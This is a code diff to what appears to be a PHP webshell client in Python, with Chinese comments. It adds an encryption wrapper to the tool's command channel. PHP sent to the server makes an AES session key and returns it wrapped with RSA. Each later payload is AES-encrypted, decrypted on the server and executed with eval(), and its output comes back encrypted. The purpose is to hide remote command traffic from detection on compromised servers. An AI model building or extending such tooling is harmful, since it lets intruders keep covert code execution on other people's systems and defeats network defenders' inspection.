@@ -11,9 +11,17 @@ import uuid
 import typing as t
 from binascii import Error as BinasciiError
 
+from Crypto.Cipher import AES
+from Crypto.Random import get_random_bytes
+
 from . import exceptions
 
-from ..utils import random_english_words, random_user_agent
+from ..utils import (
+    random_english_words,
+    random_user_agent,
+    get_rsa_key,
+    private_decrypt_rsa,
+)
 from .base import (
     PHPSessionInterface,
     DirectoryEntry,
@@ -28,11 +36,11 @@ user_agent = random_user_agent()
 DEFAULT_SESSION_ID = "".join(random.choices("1234567890abcdef", k=32))
 
 DECODER_RAW = """
-function decoder_echo($s) {echo $s;}
+function decoder_echo_raw($s) {echo $s;}
 """.strip()
 
 DECODER_BASE64 = """
-function decoder_echo($s) {echo base64_encode($s);}
+function decoder_echo_raw($s) {echo base64_encode($s);}
 """.strip()
 
 # session id was specified to avoid session
@@ -44,6 +52,14 @@ if (session_status() == PHP_SESSION_NONE) {{
     session_start();
 }}
 {decoder}
+$decoder_hooks = array();
+function decoder_echo($s) {{
+    global $decoder_hooks;
+    for($i = 0; $i < count($decoder_hooks); $i ++) {{
+        $s = ($decoder_hooks[$i])($s);
+    }}
+    echo decoder_echo_raw($s);
+}}
 echo '{delimiter_start_1}'.'{delimiter_start_2}';
 try{{{payload_raw}}}catch(Exception $e){{die("POSTEXEC_F"."AILED");}}
 echo '{delimiter_stop}';"""
@@ -290,6 +306,14 @@ def to_sessionize_payload(
     final = PAYLOAD_SESSIONIZE_TRIGGER.replace("PAYLOAD_STORE", payload_store_name)
     payloads.append(final)
     return payloads
+
+
+def padding_aes256_cbc(s):
+    return s + bytes((16 - len(s) % 16) for _ in range(16 - len(s) % 16))
+
+
+def unpadding_aes256_cbc(s):
+    return s[0 : -(s[-1])]
 
 
 # 给前端显示的PHPWebshellOptions选项
@@ -716,6 +740,85 @@ class PHPWebshell(PHPSessionInterface):
 
         return wrap
 
+    def encryption_wrapper(
+        self, submitter: t.Callable[[str], t.Awaitable[str]]
+    ) -> t.Callable[[str], t.Awaitable[str]]:
+        pubkey, _ = get_rsa_key()
+
+        @functools.wraps(submitter)
+        async def wrap(payload: str) -> str:
+            session_name = f"rsa_key_{uuid.uuid4()}"
+            key_encrypted = await submitter(
+                """
+                if(extension_loaded('openssl')) {
+                    $_SESSION[SESSION_NAME] = openssl_random_pseudo_bytes(32);
+                    openssl_public_encrypt(
+                        $_SESSION[SESSION_NAME],
+                        $encrypted,
+                        base64_decode(PUBKEY_B64),
+                        OPENSSL_PKCS1_OAEP_PADDING
+                    );
+                    decoder_echo(base64_encode($encrypted));
+                }else{
+                    decoder_echo("WRONG_NO_OPENSSL");
+                }
+            """.replace(
+                    "PUBKEY_B64", repr(base64_encode(pubkey))
+                )
+                .replace("SESSION_NAME", repr(session_name))
+                .replace("    ", "")
+                .strip()
+            )
+            try:
+                key = private_decrypt_rsa(key_encrypted)
+            except Exception as exc:
+                raise exceptions.UnknownError(
+                    "部署加密失败，无法从服务器获得对应的key"
+                ) from exc
+            iv = get_random_bytes(16)
+            payload_enc = iv + AES.new(key, AES.MODE_CBC, iv=iv).encrypt(
+                padding_aes256_cbc(payload.encode("utf-8"))
+            )
+
+            result_enc = await submitter(
+                """
+                function aes_enc($data) {
+                    $iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length('AES-256-CBC'));
+                    $encryptedData = openssl_encrypt($data, 'AES-256-CBC', $_SESSION[SESSION_NAME], 0, $iv);
+                    return base64_encode($iv . base64_decode($encryptedData));
+                }
+
+                function aes_dec($encryptedData) {
+                    $data = base64_decode($encryptedData);
+                    return openssl_decrypt(
+                        base64_encode(substr($data, 16)),
+                        'aes-256-cbc',
+                        $_SESSION[SESSION_NAME],
+                        0,
+                        substr($data, 0, 16)
+                    );
+                }
+                array_push($decoder_hooks, "aes_enc");
+                $code = aes_dec(CODE_ENC);
+                eval($code);
+                """.replace(
+                    "SESSION_NAME", repr(session_name)
+                ).replace(
+                    "CODE_ENC", repr(base64_encode(payload_enc))
+                )
+            )
+            try:
+                result_enc = base64.b64decode(result_enc)
+                iv, result_enc = result_enc[:16], result_enc[16:]
+                result = unpadding_aes256_cbc(
+                    AES.new(key, AES.MODE_CBC, iv=iv).decrypt(result_enc)
+                ).decode("utf-8")
+                return result
+            except Exception as exc:
+                raise exceptions.UnknownError("解密失败") from exc
+
+        return wrap
+
     async def _submit(self, payload: str) -> str:
         """将php payload通过encoder编码后提交"""
         start, stop = (
@@ -758,6 +861,7 @@ class PHPWebshell(PHPSessionInterface):
     async def submit(self, payload: str) -> str:
         # sessionize_payload
         submitter = self._submit
+        submitter = self.encryption_wrapper(submitter)
         if self.sessionize_payload:
             submitter = self.antireplay_wrapper(submitter)
         if self.antireplay:
